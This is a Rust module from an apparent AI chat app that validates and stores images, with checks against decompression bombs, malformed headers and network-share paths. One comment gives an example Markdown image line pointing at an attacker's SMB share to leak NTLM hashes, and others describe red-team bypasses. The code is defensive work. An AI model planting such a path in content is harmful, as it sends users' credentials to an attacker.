//! Meowo 自己的持久图片目录：`<数据根>/images/{sent,web,tool,local}`（数据根默认 `~/.meowo`）。
//!
//! 为什么要有自己的目录：对话里的图此前落在 `$TEMP/meowo-paste/queued`、CLI 的 image-cache
//! 或干脆只剩原文件路径——临时目录会被清、CLI 会清自己的缓存、原文件会被改或删，历史会话里的
//! 图随之变成裂图。凡是要在对话里显示的图，先复制进这里，引用行 `[Image: source: <路径>]`
//! 指向这里的副本，原文件之后怎么变都不影响历史。
//!
//! - `sent/`：agent 用 `send_image` 主动发给用户的图（唯一不可再生的一类，见 [`prune_in`]）。
//! - `web/`：正文 Markdown 里的网络图片，由宿主下载（按网址哈希缓存，见 [`store_keyed_in`]）。
//! - `tool/`：工具回执里内嵌的 base64 图（截图、读图），transcript 重解析时按同内容重建。
//! - `local/`：正文 Markdown 里引用的本地图片的副本。
//!
//! 统一入口只认真图：按文件头判断（png/jpg/gif/webp；svg 只按文本嗅探），不看扩展名；
//! 单张上限 [`IMAGE_MAX_BYTES`]；按内容哈希命名，同一张图只存一份，重复写入是幂等的。
//! 本 crate 不联网：网络下载在宿主（meowo-app 的 chat_images.rs）完成后再交给这里落盘。

use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

/// 单张图片上限 20MB。手机截图、设计稿导出的 PNG 通常在 1~8MB，20MB 留足余量；再大的
/// 图在对话里既加载不动也看不清细节，而 agent 发错文件（发了一个视频、一个数据库）时
/// 这道闸能在读盘前就挡住。粘贴附件的 32MB 是给「交给 CLI 读」的输入用的，这里是展示用，更紧。
pub const IMAGE_MAX_BYTES: u64 = 20 * 1024 * 1024;

/// 图片目录总量上限 2GB，超出时按 [`prune_in`] 的顺序回收。按单张 20MB 封顶算至少能放 100 张
/// 最大尺寸的图，实际截图多在几百 KB，够放上万张；2GB 对今天的磁盘不算负担，又不至于无限长。
pub const IMAGES_TOTAL_CAP: u64 = 2 * 1024 * 1024 * 1024;

/// 宽 × 高超过一亿像素的位图不收（约 10000×10000）。图片文件可以很小但解出来数 GB（解码炸弹），
/// webview 解码时会把渲染进程撑爆。只看文件头里的尺寸字段，不解码。
pub const IMAGE_MAX_PIXELS: u64 = 100_000_000;

/// 图片的用途，决定落进哪个子目录。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ImageKind {
    Sent,
    Web,
    Tool,
    Local,
}

impl ImageKind {
    pub const ALL: [ImageKind; 4] = [Self::Sent, Self::Web, Self::Tool, Self::Local];

    pub fn dir_name(self) -> &'static str {
        match self {
            Self::Sent => "sent",
            Self::Web => "web",
            Self::Tool => "tool",
            Self::Local => "local",
        }
    }
}

/// 失败原因的固定代码（前后端约定 contract.md：`[Image error: <code>] `）。
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../../../src/generated/contracts/"))]
#[serde(rename_all = "snake_case")]
pub enum ImageErrorCode {
    NotFound,
    NotImage,
    TooLarge,
    DownloadFailed,
    Forbidden,
}

impl ImageErrorCode {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::NotFound => "not_found",
            Self::NotImage => "not_image",
            Self::TooLarge => "too_large",
            Self::DownloadFailed => "download_failed",
            Self::Forbidden => "forbidden",
        }
    }
}

/// 一次失败：代码给前端分支用，`message` 是一句人话（给模型看，也直接显示给用户）。
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../../../src/generated/contracts/"))]
pub struct ImageError {
    pub code: ImageErrorCode,
    pub message: String,
}

impl ImageError {
    pub fn new(code: ImageErrorCode, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
        }
    }

    /// 发图工具失败时的回执正文：`[Image error: <code>] <原因>`（contract.md 约定的前缀）。
    pub fn receipt(&self) -> String {
        format!("{ERROR_PREFIX}{}] {}", self.code.as_str(), self.message)
    }
}

impl std::fmt::Display for ImageError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.receipt())
    }
}

/// `resolve_chat_image` 的返回（contract.md）：成功给持久目录里的路径，失败给原因。
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../../../src/generated/contracts/"))]
#[serde(untagged)]
pub enum ResolvedChatImage {
    Ok { path: String },
    Err { error: ImageError },
}

impl From<Result<PathBuf, ImageError>> for ResolvedChatImage {
    fn from(result: Result<PathBuf, ImageError>) -> Self {
        match result {
            Ok(path) => Self::Ok {
                path: path.to_string_lossy().into_owned(),
            },
            Err(error) => Self::Err { error },
        }
    }
}

/// Meowo MCP 服务器在各家那边的名字与发图工具名（meowo-reporter mcp.rs）。各家插件按自己的
/// MCP 命名形态拼全名（claude/kimi `mcp__meowo__send_image`、gemini `mcp_meowo_send_image`、
/// opencode `meowo_send_image`、codex 命名空间 `mcp__meowo` + `send_image`）。
pub const MCP_SERVER: &str = "meowo";
pub const SEND_IMAGE: &str = "send_image";

/// Meowo 自己的 MCP 工具（发图、浏览器）在对话页上统一叫 `mcp__meowo__<工具>`：claude、kimi
/// 原样就是这个形态，codex 的命名空间形态由插件拼成它。gemini（`mcp_meowo_<工具>`）与 opencode
/// （`meowo_<工具>`）把服务器名与工具名用单下划线拼在一起，前端拆不开，按原名显示出
/// `mcp_meowo_browser_screenshot` 这种乱码（2026-11-21 五家回放截图）。插件传入自己的前缀，
/// 认出来就换成统一名字，前端只认一种形态；不是 Meowo 的工具原样返回。
pub fn canonical_meowo_tool(name: &str, prefix: &str) -> String {
    match name.strip_prefix(prefix) {
        Some(tool) if !tool.is_empty() => format!("mcp__{MCP_SERVER}__{tool}"),
        _ => name.to_string(),
    }
}

/// 发图调用 → (类别, 摘要, 详情)：五家插件共用。摘要优先用说明，没有说明给来源。
pub fn send_image_call(
    args: &serde_json::Value,
) -> (
    meowo_protocol::ipc::ToolKind,
    String,
    Option<meowo_protocol::ipc::ToolDetail>,
) {
    let detail = meowo_protocol::ipc::ToolDetail::image_from_args(args);
    let summary = match &detail {
        Some(meowo_protocol::ipc::ToolDetail::Image { source, caption }) => {
            caption.clone().unwrap_or_else(|| source.clone())
        }
        _ => String::new(),
    };
    let summary: String = summary.chars().take(200).collect();
    (meowo_protocol::ipc::ToolKind::Image, summary, detail)
}

/// 失败回执的固定前缀（后跟代码与 `] `）。
pub const ERROR_PREFIX: &str = "[Image error: ";

/// 图片引用行（前端 Message.tsx 的 IMAGE_REF 认这个格式）。
pub fn image_ref_line(path: &Path) -> String {
    format!("[Image: source: {}]", path.display())
}

/// 默认的图片根目录：`<数据根>/images`。数据根跟随 `MEOWO_DB`，与宿主 `meowo_dir()` 同口径。
/// 本 crate 的单元测试改落系统临时目录：transcript 解析测试会走默认根，不能往开发者真实的
/// `~/.meowo/images` 里塞测试图。
pub fn images_root() -> Option<PathBuf> {
    #[cfg(test)]
    let root = Some(std::env::temp_dir().join("meowo-agent-test-images"));
    #[cfg(not(test))]
    let root = crate::meowo_data_root().map(|root| root.join("images"));
    root
}

/// 按文件头判断是不是图片，是就返回规范扩展名。扩展名不可信：agent 可能把 HTML 错误页存成
/// `.png`，或发来一个改了名的可执行文件——只认文件头。
pub fn sniff_image(bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        return Some("png");
    }
    if bytes.starts_with(&[0xFF, 0xD8, 0xFF]) {
        return Some("jpg");
    }
    if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        return Some("gif");
    }
    if bytes.len() >= 12 && &bytes[..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
        return Some("webp");
    }
    if looks_like_svg(bytes) {
        return Some("svg");
    }
    None
}

/// SVG 是文本，没有魔数：只在开头允许 BOM、空白、XML 声明、注释、DOCTYPE，之后第一个元素
/// 必须是 `<svg`。不做完整 XML 解析——SVG 只以 `<img>` 方式显示（不执行脚本），这里要挡的
/// 只是「把 HTML / 普通文本当图片」。
fn looks_like_svg(bytes: &[u8]) -> bool {
    svg_root_offset(bytes).is_some()
}

/// 根元素 `<svg` 在字节里的起点（见 [`looks_like_svg`]）；不是 SVG 返回 None。
fn svg_root_offset(bytes: &[u8]) -> Option<usize> {
    let head = &bytes[..bytes.len().min(4096)];
    // 截断可能切在多字节字符中间：只取合法 UTF-8 的前缀。
    let text = match std::str::from_utf8(head) {
        Ok(text) => text,
        Err(e) => std::str::from_utf8(&head[..e.valid_up_to()]).unwrap_or(""),
    };
    let mut rest = text.strip_prefix('\u{feff}').unwrap_or(text);
    loop {
        rest = rest.trim_start();
        if let Some(after) = rest.strip_prefix("<?") {
            let end = after.find("?>")?;
            rest = &after[end + 2..];
        } else if let Some(after) = rest.strip_prefix("<!--") {
            let end = after.find("-->")?;
            rest = &after[end + 3..];
        } else if rest.len() >= 9 && rest[..9].eq_ignore_ascii_case("<!doctype") {
            let after = &rest[9..];
            // DOCTYPE 可能带内部子集 `[...]`：跳到子集结束后的 `>`。
            let end = match (after.find('['), after.find('>')) {
                (Some(open), Some(close)) if open < close => {
                    let sub_end = after[open..].find(']')?;
                    let tail = &after[open + sub_end..];
                    open + sub_end + tail.find('>')?
                }
                (_, Some(close)) => close,
                _ => return None,
            };
            rest = &after[end + 1..];
        } else {
            break;
        }
    }
    let after = rest.strip_prefix("<svg")?;
    matches!(after.chars().next(), Some(c) if c.is_whitespace() || c == '>' || c == '/')
        .then(|| text.len() - rest.len())
}

/// SVG 单边上限（CSS 像素）。`<img>` 按固有尺寸栅格化，灯箱「原尺寸」显示时一张几百字节的
/// SVG 写 `width="100000"` 就能让渲染进程申请数十 GB；2 万像素的边已远超任何屏幕与常见设计稿。
pub const SVG_MAX_SIDE: f64 = 20_000.0;

/// SVG 根元素上声明的尺寸：`width`/`height`（换算成 CSS 像素；百分比等相对单位不算），没写时
/// 按 `viewBox` 的宽高（浏览器此时以它定固有尺寸与比例）。单边超过 [`SVG_MAX_SIDE`] 或面积超过
/// [`IMAGE_MAX_PIXELS`] 拒（too_large）。读不到尺寸的放行：没有固有尺寸的 SVG 由页面按容器定大小。
fn check_svg_size(bytes: &[u8]) -> Result<(), ImageError> {
    let Some(start) = svg_root_offset(bytes) else {
        return Ok(());
    };
    // 根元素开标签：到第一个 `>` 为止，最多看 64KB（属性再长也不是正常的 SVG）。
    let tail = &bytes[start..bytes.len().min(start + 64 * 1024)];
    let end = tail.iter().position(|b| *b == b'>').unwrap_or(tail.len());
    let tag = String::from_utf8_lossy(&tail[4..end]);
    let attrs = svg_attrs(&tag);
    let attr = |name: &str| attrs.iter().find(|(k, _)| k == name).map(|(_, v)| v.as_str());
    let view_box = attr("viewBox").and_then(|v| {
        let nums = v
            .split(|c: char| c.is_whitespace() || c == ',')
            .filter(|s| !s.is_empty())
            .map(|s| s.parse::<f64>().ok())
            .collect::<Option<Vec<f64>>>()?;
        (nums.len() == 4).then(|| (nums[2], nums[3]))
    });
    let width = attr("width").and_then(svg_length).or(view_box.map(|v| v.0));
    let height = attr("height").and_then(svg_length).or(view_box.map(|v| v.1));
    let too_big = |v: Option<f64>| v.is_some_and(|v| !v.is_finite() || v.abs() > SVG_MAX_SIDE);
    let area_too_big = matches!((width, height), (Some(w), Some(h)) if w.abs() * h.abs() > IMAGE_MAX_PIXELS as f64);
    if too_big(width) || too_big(height) || area_too_big {
        let show = |v: Option<f64>| v.map_or("?".to_string(), |v| format!("{v:.0}"));
        return Err(ImageError::new(
            ImageErrorCode::TooLarge,
            format!(
                "SVG 尺寸太大（{}×{}），单边上限 {} 像素、总面积上限 1 亿像素",
                show(width),
                show(height),
                SVG_MAX_SIDE
            ),
        ));
    }
    Ok(())
}

/// 开标签里的 `名=值` 属性（值带单引号或双引号）。只够读尺寸用，不是 XML 解析器。
fn svg_attrs(tag: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut rest = tag;
    loop {
        rest = rest.trim_start_matches(|c: char| c.is_whitespace() || c == '/');
        if rest.is_empty() {
            return out;
        }
        let name_end = rest
            .find(|c: char| c.is_whitespace() || c == '=' || c == '/')
            .unwrap_or(rest.len());
        let name = &rest[..name_end];
        rest = rest[name_end..].trim_start();
        let Some(after_eq) = rest.strip_prefix('=') else {
            if name.is_empty() {
                // 不认识的字符：跳过一个，免得死循环。
                let mut chars = rest.chars();
                chars.next();
                rest = chars.as_str();
            }
            continue;
        };
        rest = after_eq.trim_start();
        let Some(quote) = rest.chars().next().filter(|c| *c == '"' || *c == '\'') else {
            let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
            out.push((name.to_string(), rest[..end].to_string()));
            rest = &rest[end..];
            continue;
        };
        let body = &rest[1..];
        let end = body.find(quote).unwrap_or(body.len());
        out.push((name.to_string(), body[..end].to_string()));
        rest = body.get(end + 1..).unwrap_or("");
    }
}

/// SVG 长度换算成 CSS 像素（CSS 规定 1in = 96px）。百分比、无法解析的返回 None。
fn svg_length(raw: &str) -> Option<f64> {
    let raw = raw.trim();
    let split = raw
        .find(|c: char| !(c.is_ascii_digit() || matches!(c, '.' | '-' | '+' | 'e' | 'E')))
        .unwrap_or(raw.len());
    // `1e3px` 合法，但 `em`/`ex` 单位以 e 开头：数字部分末尾的 e 归单位。
    let (mut num, mut unit) = raw.split_at(split);
    if let Some(stripped) = num.strip_suffix(['e', 'E']) {
        num = stripped;
        unit = &raw[num.len()..];
    }
    let value: f64 = num.parse().ok()?;
    let scale = match unit.trim().to_ascii_lowercase().as_str() {
        "" | "px" => 1.0,
        "in" => 96.0,
        "cm" => 96.0 / 2.54,
        "mm" => 96.0 / 25.4,
        "q" => 96.0 / 101.6,
        "pt" => 96.0 / 72.0,
        "pc" => 16.0,
        "em" | "rem" | "ex" | "ch" => 16.0,
        _ => return None,
    };
    Some(value * scale)
}

/// 从文件头读位图尺寸（宽, 高），不解码。读不出（SVG、少见的子格式、截断或损坏的头、
/// 宽或高为 0）返回 None。
pub fn image_dimensions(bytes: &[u8]) -> Option<(u32, u32)> {
    image_dimensions_raw(bytes).filter(|(w, h)| *w > 0 && *h > 0)
}

fn image_dimensions_raw(bytes: &[u8]) -> Option<(u32, u32)> {
    let be16 = |b: &[u8], at: usize| -> Option<u32> {
        Some(u16::from_be_bytes([*b.get(at)?, *b.get(at + 1)?]) as u32)
    };
    let le16 = |b: &[u8], at: usize| -> Option<u32> {
        Some(u16::from_le_bytes([*b.get(at)?, *b.get(at + 1)?]) as u32)
    };
    let be32 = |b: &[u8], at: usize| -> Option<u32> {
        Some(u32::from_be_bytes(b.get(at..at + 4)?.try_into().ok()?))
    };
    match sniff_image(bytes)? {
        // IHDR 紧跟签名：宽高各 4 字节大端。
        // IHDR 必须是第一块（PNG 规范），宽高各 4 字节大端紧跟块类型。
        "png" => {
            if bytes.get(12..16)? != b"IHDR" {
                return None;
            }
            Some((be32(bytes, 16)?, be32(bytes, 20)?))
        }
        "gif" => Some((le16(bytes, 6)?, le16(bytes, 8)?)),
        "webp" => {
            let chunk = bytes.get(12..16)?;
            match chunk {
                b"VP8X" => {
                    let w = u32::from_le_bytes([*bytes.get(24)?, *bytes.get(25)?, *bytes.get(26)?, 0]) + 1;
                    let h = u32::from_le_bytes([*bytes.get(27)?, *bytes.get(28)?, *bytes.get(29)?, 0]) + 1;
                    Some((w, h))
                }
                b"VP8 " => Some((le16(bytes, 26)? & 0x3FFF, le16(bytes, 28)? & 0x3FFF)),
                b"VP8L" => {
                    let b = bytes.get(21..25)?;
                    let bits = u32::from_le_bytes(b.try_into().ok()?);
                    Some(((bits & 0x3FFF) + 1, ((bits >> 14) & 0x3FFF) + 1))
                }
                _ => None,
            }
        }
        "jpg" => {
            // 按 libjpeg 的 next_marker 走段：段与段之间的杂字节跳过（解码器只给个警告照常解），
            // 填充用的连续 0xFF 跳过；找到 SOFn（帧头）读高宽。做空复现过「SOF 前插一个杂字节」
            // 让旧实现读不出尺寸而放行 60000×60000 的图，所以这里必须和解码器一样宽容。
            let mut at = 2;
            loop {
                while *bytes.get(at)? != 0xFF {
                    at += 1;
                }
                while *bytes.get(at)? == 0xFF {
                    at += 1;
                }
                let marker = *bytes.get(at)?;
                at += 1;
                match marker {
                    // 0xFF00 是数据里的转义；TEM、RSTn、SOI 没有长度字段。
                    0x00 | 0x01 | 0xD0..=0xD8 => {}
                    // 帧头之前就到了扫描数据或文件尾：不是能解码的 JPEG。
                    0xD9 | 0xDA => return None,
                    0xC0..=0xCF if !matches!(marker, 0xC4 | 0xC8 | 0xCC) => {
                        return Some((be16(bytes, at + 5)?, be16(bytes, at + 3)?));
                    }
                    _ => {
                        let len = be16(bytes, at)? as usize;
                        if len < 2 {
                            return None;
                        }
                        at += len;
                    }
                }
            }
        }
        _ => None,
    }
}

/// 校验一段字节能不能进图片目录：非空、不超 [`IMAGE_MAX_BYTES`]、文件头是图片、像素数不超
/// [`IMAGE_MAX_PIXELS`]。返回规范扩展名。
pub fn validate(bytes: &[u8]) -> Result<&'static str, ImageError> {
    if bytes.len() as u64 > IMAGE_MAX_BYTES {
        return Err(too_large(bytes.len() as u64));
    }
    let Some(ext) = sniff_image(bytes) else {
        return Err(ImageError::new(
            ImageErrorCode::NotImage,
            "这不是图片文件（只支持 PNG、JPEG、GIF、WebP、SVG，按文件内容判断，不看扩展名）",
        ));
    };
    if ext == "svg" {
        check_svg_size(bytes)?;
        return Ok(ext);
    }
    // 位图读不出尺寸一律拒：读不出就判断不了是不是解码炸弹，宁可不收（做空第一轮：旧实现放行）。
    let Some((w, h)) = image_dimensions(bytes) else {
        return Err(ImageError::new(
            ImageErrorCode::NotImage,
            "读不出图片尺寸（文件头损坏、被截断，或是不支持的子格式）",
        ));
    };
    if w as u64 * h as u64 > IMAGE_MAX_PIXELS {
        return Err(ImageError::new(
            ImageErrorCode::TooLarge,
            format!("图片尺寸太大（{w}×{h}），超过 1 亿像素的上限"),
        ));
    }
    Ok(ext)
}

pub fn too_large(len: u64) -> ImageError {
    ImageError::new(
        ImageErrorCode::TooLarge,
        format!(
            "图片太大（{:.1} MB），单张上限 {} MB",
            len as f64 / 1024.0 / 1024.0,
            IMAGE_MAX_BYTES / 1024 / 1024
        ),
    )
}

fn hex_digest(data: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(data);
    // 128 位足够区分本机所有图片，文件名短一半。
    digest[..16].iter().map(|b| format!("{b:02x}")).collect()
}

/// 把一张图存进 `root/<kind>/`，按内容哈希命名。同一内容重复写入直接复用，并把修改时间刷新为
/// 现在——回收按修改时间从旧到新删，常被引用的图因此留得最久。
pub fn store_bytes_in(root: &Path, kind: ImageKind, bytes: &[u8]) -> Result<PathBuf, ImageError> {
    let ext = validate(bytes)?;
    let name = format!("{}.{ext}", hex_digest(bytes));
    write_named(&root.join(kind.dir_name()), &name, bytes, kind == ImageKind::Sent).map(|(path, _)| path)
}

/// 同 [`store_bytes_in`]，落在默认根目录。
pub fn store_bytes(kind: ImageKind, bytes: &[u8]) -> Result<PathBuf, ImageError> {
    store_bytes_in(&default_root()?, kind, bytes)
}

/// 按「键」（网址）而不是内容命名：网络图片的缓存要能在下载前就按网址查到（见 [`cached_keyed_in`]）。
pub fn store_keyed_in(
    root: &Path,
    kind: ImageKind,
    key: &str,
    bytes: &[u8],
) -> Result<PathBuf, ImageError> {
    let ext = validate(bytes)?;
    let name = format!("{}.{ext}", hex_digest(key.as_bytes()));
    write_named(&root.join(kind.dir_name()), &name, bytes, kind == ImageKind::Sent).map(|(path, _)| path)
}

/// 正文本地图的副本：`local/<来源哈希>-<内容哈希>.<扩展名>`。
///
/// - 文件名带来源（原路径）：原文件删掉后，[`cached_local_copy_in`] 按原路径还能找到上次的副本
///   （做空第一轮：此前只按内容命名，原文件一删就查不到）。
/// - 文件名也带内容：原文件改了内容就是新文件名、新网址，webview 不会拿缓存里的旧图。
///   写出新版本时把同一来源的旧版本删掉，`local/` 不随编辑次数增长。
pub fn store_local_copy_in(root: &Path, source_key: &str, path: &Path) -> Result<PathBuf, ImageError> {
    let bytes = read_image_file(path)?;
    let ext = validate(&bytes)?;
    let prefix = format!("{}-", hex_digest(source_key.as_bytes()));
    let name = format!("{prefix}{}.{ext}", hex_digest(&bytes));
    let dir = root.join(ImageKind::Local.dir_name());
    let (stored, fresh) = write_named(&dir, &name, &bytes, false)?;
    if fresh {
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for entry in entries.flatten() {
                let file = entry.file_name();
                let file = file.to_string_lossy();
                if file.starts_with(&prefix) && file != name && !file.contains(".tmp.") {
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
    }
    Ok(stored)
}

/// 按原路径找 [`store_local_copy_in`] 存过的副本（原文件已经不在时用），取最新的一份。
pub fn cached_local_copy_in(root: &Path, source_key: &str) -> Option<PathBuf> {
    let prefix = format!("{}-", hex_digest(source_key.as_bytes()));
    let _guard = STORE_LOCK.read().unwrap_or_else(|e| e.into_inner());
    let entries = std::fs::read_dir(root.join(ImageKind::Local.dir_name())).ok()?;
    let hit = entries
        .flatten()
        .filter(|entry| {
            let name = entry.file_name();
            let name = name.to_string_lossy();
            name.starts_with(&prefix) && !name.contains(".tmp.")
        })
        .filter_map(|entry| {
            let meta = entry.metadata().ok()?;
            (meta.is_file() && meta.len() > 0).then(|| (meta.modified().ok(), entry.path()))
        })
        .max_by_key(|(mtime, _)| *mtime)
        .map(|(_, path)| path)?;
    touch_unlocked(&hit);
    Some(hit)
}

/// 按键找已缓存的图（任意扩展名）。
pub fn cached_keyed_in(root: &Path, kind: ImageKind, key: &str) -> Option<PathBuf> {
    let stem = hex_digest(key.as_bytes());
    let dir = root.join(kind.dir_name());
    // 找到与刷新在同一把读锁里：回收不会在两步之间把它删掉（见 prune_in_with）。
    let _guard = STORE_LOCK.read().unwrap_or_else(|e| e.into_inner());
    ["png", "jpg", "gif", "webp", "svg"]
        .iter()
        .map(|ext| dir.join(format!("{stem}.{ext}")))
        .find(|path| std::fs::metadata(path).is_ok_and(|m| m.is_file() && m.len() > 0))
        .inspect(|path| {
            touch_unlocked(path);
        })
}

/// 读一个本地文件存进图片目录。先看元数据再读：不存在、是目录、超过上限都不读盘。
pub fn store_file_in(root: &Path, kind: ImageKind, path: &Path) -> Result<PathBuf, ImageError> {
    let bytes = read_image_file(path)?;
    store_bytes_in(root, kind, &bytes)
}

pub fn store_file(kind: ImageKind, path: &Path) -> Result<PathBuf, ImageError> {
    store_file_in(&default_root()?, kind, path)
}

/// 读本地图片文件（带存在性与大小检查），不落盘。UNC / 设备路径在碰文件系统之前拒（见 [`is_remote_path`]）。
pub fn read_image_file(path: &Path) -> Result<Vec<u8>, ImageError> {
    if is_remote(path) {
        return Err(remote_forbidden());
    }
    let meta = std::fs::metadata(path).map_err(|_| {
        ImageError::new(
            ImageErrorCode::NotFound,
            format!("找不到文件：{}", path.display()),
        )
    })?;
    if !meta.is_file() {
        return Err(ImageError::new(
            ImageErrorCode::NotFound,
            format!("不是文件：{}", path.display()),
        ));
    }
    if meta.len() > IMAGE_MAX_BYTES {
        return Err(too_large(meta.len()));
    }
    if meta.len() == 0 {
        return Err(ImageError::new(ImageErrorCode::NotImage, "文件是空的"));
    }
    std::fs::read(path).map_err(|e| {
        ImageError::new(
            ImageErrorCode::NotFound,
            format!("读不了文件 {}：{e}", path.display()),
        )
    })
}

/// 是不是网络共享或设备路径：`\\host\…`、`//host/…`（两个分隔符开头，含 `\\?\UNC\…`、`\\.\pipe\…`、
/// `\\?\GLOBALROOT\…`），`file://<主机>/…`，以及 Windows 路径前缀为 UNC / VerbatimUNC / DeviceNS /
/// Verbatim 的。唯一放行的双分隔符开头是 `\\?\C:\…`（VerbatimDisk，本机盘符）。
///
/// 为什么：Windows 上对 `\\host\share` 做任何文件系统调用（metadata、canonicalize、open）都会
/// 发起 SMB 连接，并可能自动带上当前用户的 NTLM 凭据——一行 `![](\\attacker\x.png)` 或一次
/// `send_image` 就能把哈希送出去（做空第一轮）。所以这是纯字符串判断，必须在任何文件系统访问之前做。
pub fn is_remote_path(raw: &str) -> bool {
    let s = raw.trim();
    let b = s.as_bytes();
    let sep = |c: u8| c == b'\\' || c == b'/';
    if b.len() >= 2 && sep(b[0]) && sep(b[1]) {
        // `\\?\C:\…`：本机盘符的长路径形式。
        let verbatim_disk = b.len() >= 6
            && b[2] == b'?'
            && sep(b[3])
            && b[4].is_ascii_alphabetic()
            && b[5] == b':'
            && b.get(6).is_none_or(|c| sep(*c));
        return !verbatim_disk;
    }
    if s.len() >= 5 && s[..5].eq_ignore_ascii_case("file:") {
        let rest = s[5..].trim_start_matches(['/', '\\']);
        let slashes = s.len() - 5 - rest.len();
        // `file://host/…`：两个斜杠后跟非空主机名（`file:///C:/…` 是三个斜杠、主机为空）。
        if slashes == 2 && !rest.is_empty() {
            return true;
        }
        if slashes >= 4 {
            return true; // `file:////host/share`：浏览器与 url 库都当 UNC
        }
    }
    #[cfg(windows)]
    {
        use std::path::{Component, Prefix};
        if let Some(Component::Prefix(prefix)) = Path::new(s).components().next() {
            return !matches!(prefix.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_));
        }
    }
    false
}

/// [`is_remote_path`] 的路径版。
pub fn is_remote(path: &Path) -> bool {
    is_remote_path(&path.to_string_lossy())
}

/// UNC / 设备路径的统一拒绝原因。
pub fn remote_forbidden() -> ImageError {
    ImageError::new(
        ImageErrorCode::Forbidden,
        "不读取网络共享或设备路径（\\\\主机\\共享 这类）上的图片：先把图片复制到本机再发",
    )
}

/// 工具回执里的内嵌 base64 图落进 `tool/`，返回引用路径。transcript 解析用：任何失败都返回
/// None（这张图退化为不显示，正文照常）。声明的 MIME 不可信，仍按文件头判断。
pub fn store_tool_base64(data: &str) -> Option<PathBuf> {
    // 编码后长度 ≈ 4/3 原始大小：先按编码长度挡超大 payload，再解码。
    if data.len() as u64 > IMAGE_MAX_BYTES / 3 * 4 + 4 {
        return None;
    }
    let key = tool_memo_key(data);
    if let Some(hit) = tool_memo_get(key) {
        return hit;
    }
    use base64::Engine;
    let stored = base64::engine::general_purpose::STANDARD
        .decode(data.trim().as_bytes())
        .ok()
        .and_then(|bytes| store_bytes(ImageKind::Tool, &bytes).ok());
    tool_memo_put(key, stored.clone());
    stored
}

/// 回执内嵌图的进程内备忘：同一段 base64 上次落成了哪个文件（或者不是图）。
///
/// 为什么要它：长会话每次整读（打开对话、窗口重载、撤回后重灌）都会把几百张回执图重新
/// base64 解码、算 SHA-256、查文件、刷修改时间；2026-11-21 用 33MB / 104 张图的真实会话实测
/// 比改动前慢 7.8%（SPEC 要求 ≤ 5%）。备忘按 base64 原文的指纹认：foldhash 每进程随机种子，
/// 外人造不出碰撞；再带上长度做第二道校验。命中时不解码、不碰文件系统，只是每隔
/// [`TOUCH_EVERY`] 刷一次修改时间（顺带确认文件还在，不在就作废重存）。
/// 回收删过文件后整表清空（见 [`prune_in_with`]）。
struct ToolMemo {
    state: foldhash::quality::RandomState,
    entries: std::collections::HashMap<(u64, usize), (Option<PathBuf>, std::time::Instant)>,
}

static TOOL_MEMO: std::sync::Mutex<Option<ToolMemo>> = std::sync::Mutex::new(None);
/// 备忘的条目上限：每条几十字节，上万张图也只是几百 KB；超了整表清掉重来。
const TOOL_MEMO_MAX: usize = 16_384;

fn tool_memo_key(data: &str) -> (u64, usize) {
    use std::hash::BuildHasher;
    let mut memo = TOOL_MEMO.lock().unwrap_or_else(|e| e.into_inner());
    let memo = memo.get_or_insert_with(|| ToolMemo {
        state: foldhash::quality::RandomState::default(),
        entries: Default::default(),
    });
    (memo.state.hash_one(data.as_bytes()), data.len())
}

/// 命中返回 Some(上次的结果)；没见过、或那个文件已经不在了返回 None。
fn tool_memo_get(key: (u64, usize)) -> Option<Option<PathBuf>> {
    let mut memo = TOOL_MEMO.lock().unwrap_or_else(|e| e.into_inner());
    let entries = &mut memo.as_mut()?.entries;
    let (path, touched) = entries.get_mut(&key)?;
    if let Some(path) = path {
        if touched.elapsed() > TOUCH_EVERY {
            let _guard = STORE_LOCK.read().unwrap_or_else(|e| e.into_inner());
            if !touch_unlocked(path) {
                entries.remove(&key);
                return None;
            }
            *touched = std::time::Instant::now();
        }
    }
    Some(path.clone())
}

fn tool_memo_put(key: (u64, usize), stored: Option<PathBuf>) {
    let mut memo = TOOL_MEMO.lock().unwrap_or_else(|e| e.into_inner());
    if let Some(memo) = memo.as_mut() {
        if memo.entries.len() >= TOOL_MEMO_MAX {
            memo.entries.clear();
        }
        memo.entries.insert(key, (stored, std::time::Instant::now()));
    }
}

/// 回收删了文件：备忘里的路径可能已失效，整表作废（下次解析按原流程重存）。
fn clear_tool_memo() {
    if let Some(memo) = TOOL_MEMO.lock().unwrap_or_else(|e| e.into_inner()).as_mut() {
        memo.entries.clear();
    }
}

// ── 写出 / 修改的图片：按调用留快照 ─────────────────────

/// 「写入或修改了图片文件」的工具调用 → 它写的图片路径。解析器看到调用时登记，看到回执时
/// 取出来做快照（见 [`snapshot_written`]）。调用与回执常在不同的增量批次里，所以放进程级表；
/// 快照本身落盘按调用 id 命名，表丢了（重启）也只是这一次回执没在同一批里时少补一行，
/// 下次整读会补上。
static WRITTEN_IMAGES: std::sync::Mutex<Option<std::collections::HashMap<String, Vec<PathBuf>>>> =
    std::sync::Mutex::new(None);
/// 表里有没有东西：没有图片写入的会话（绝大多数）在每条回执上只多一次原子读，不碰锁。
static WRITTEN_ANY: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
